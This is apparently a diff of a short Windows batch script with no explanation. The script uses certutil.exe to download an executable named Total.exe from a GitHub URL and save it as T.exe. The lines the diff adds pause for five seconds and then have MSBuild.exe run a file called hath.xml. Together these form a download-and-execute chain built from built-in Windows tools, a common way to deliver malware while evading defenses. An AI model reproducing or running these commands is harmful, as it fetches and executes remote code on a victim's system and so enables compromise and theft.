@@ -1,1 +1,5 @@
 certutil.exe -urlcache -f https://github.com/benjiabcdir/p/blob/master/Total.exe T.exe
+
+timeout /T 5
+
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe hath.xml
